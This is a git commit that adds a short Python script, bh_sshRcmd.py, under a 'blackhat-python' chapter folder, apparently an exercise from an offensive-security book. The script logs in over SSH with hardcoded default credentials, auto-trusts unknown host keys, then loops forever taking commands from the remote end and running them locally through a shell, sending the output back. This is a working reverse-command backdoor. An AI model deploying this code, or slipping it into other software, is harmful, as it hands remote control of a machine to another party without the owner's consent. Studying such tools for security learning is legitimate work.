bbe561647bb25cd3afc779611b8d98a9cdcb5c65
rpigu-i <8628078+rpigu-i@users.noreply.github.com>
2020-03-13 08:34:03 -0400

    Added bh_sshRcmd.py

---
+++ blackhat-python/ch2/bh_sshRcmd.py
@@ -0,0 +1,32 @@
+import threading
+import paramiko
+import subprocess
+
+def ssh_command(ip, user, passwd, command, keys):
+
+    client = paramiko.SSHClient()
+
+    if keys:
+        client.load_host_keys(keys)
+    
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+
+    if ssh_session.active:
+        ssh_session.exec_command(command)
+        print(ssh_session.recv(1024))
+        while True:
+            command = ssh_session.recv(1024)
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception as e:
+                ssh_session.send(str(e))
+        client.close()
+    return
+
+
+ssh_command('192.168.1.1', 'admin', 'admin', 'id', False)
+
+     
